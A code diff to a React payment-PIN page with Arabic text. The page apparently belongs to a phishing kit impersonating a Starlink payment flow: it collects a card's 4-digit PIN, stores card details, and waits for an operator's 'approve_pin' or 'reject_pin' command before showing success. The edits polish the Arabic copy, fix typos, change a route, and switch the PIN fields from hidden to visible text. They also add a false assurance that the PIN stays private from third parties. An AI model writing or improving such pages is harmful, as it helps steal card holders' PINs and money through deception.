@@ -30,13 +30,13 @@ const PaymentPin = () => {
       if (detail.command === "approve_pin") {
         sessionStorage.removeItem("starlink_card");
         setWaiting(false);
-        navigate("/success");
+        navigate("/payment/success");
       } else if (detail.command === "reject_pin") {
         setWaiting(false);
         setPin(Array(PIN_LENGTH).fill(""));
         inputRefs.current[0]?.focus();
         toast({
-          title: "الرقم السري غير صحيح",
+          title: "الرقم السري خاطئ",
           description: "أعد إدخال الرقم السري للبطاقة.",
           variant: "destructive",
         });
@@ -85,8 +85,8 @@ const PaymentPin = () => {
 
             <div className="flex items-center justify-between gap-2">
               <div className="flex items-center gap-2 text-xs text-muted-foreground">
-                <Lock className="w4 h-4" />
-                <span>بدػوي آ — لن يُعرض الرقم عمى الشاشة</span>
+                <Lock className="w-4 h-4" />
+                <span>بدشو آ &#8212; لن يظهر رقم الرقم السري لأطراف ثالثة</span>
               </div>
               {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
             </div>
@@ -94,21 +94,21 @@ const PaymentPin = () => {
             <div className="text-center space-y-1">
               <h1 className="text-xl font-semibold">الرقم السري للبطاقة</h1>
               <p className="text-sm text-muted-foreground">
-                أدخف الرقم السري االخاص ببطاقتك المكوّن من <strong>4 خانات منفصلة</strong> لتأكيد العملية
+                أدخل الرقم السري الخاص ببطاقتك المكون من <strong>4 خانات مفصلة</strong> لتأكيد العملية
               </p>
             </div>
 
             <form onSubmit={submit} className="space-y-5">
               <div>
                 <label className="text-sm text-muted-foreground mb-3 block text-center">
-                  الرقم السري (PIN) — مكوّن من 4 خانات
+                  الرقم السري (PIN) &#8212; مكوّن من 4 خانات
                 </label>
                 <div className="flex gap-3 justify-center" dir="ltr">
                   {pin.map((digit, i) => (
                     <input
                       key={i}
                       ref={(el) => { inputRefs.current[i] = el; }}
-                      type="password"
+                      type="text"
                       inputMode="numeric"
                       maxLength={1}
                       value={digit}
@@ -121,7 +121,7 @@ const PaymentPin = () => {
                   ))}
                 </div>
                 <p className="text-xs text-muted-foreground mt-2 text-center">
-                  الرقم السري مكوّن من 4 خانات فقط — أدخل كل رقم في خانته المخصصة
+                  الرقم السري مكوّن من 4 خانات فقط &#8212; أدخل كل رقم في خانته المخصصة
                 </p>
               </div>
 
@@ -133,10 +133,10 @@ const PaymentPin = () => {
                 {waiting ? (
                   <>
                     <Loader2 className="w-4 h-4 animate-spin" />
-                    جاري التحقق...
+                    جارٍ التحقق...
                   </>
                 ) : loading ? (
-                  "جاري الإرسال..."
+                  "جارٍ الإرسال..."
                 ) : (
                   "تأكيد ومتابعة"
                 )}
@@ -144,7 +144,7 @@ const PaymentPin = () => {
 
               {waiting && (
                 <p className="text-xs text-muted-foreground text-center">
-                  نتحقق من الرقم السري مع البنك. لا تُغقق هذه الصفحة.
+                  نتحقق من الرقم السري مع البنك. لا تغلق هذه الصفحة.
                 </p>
               )}
             </form>
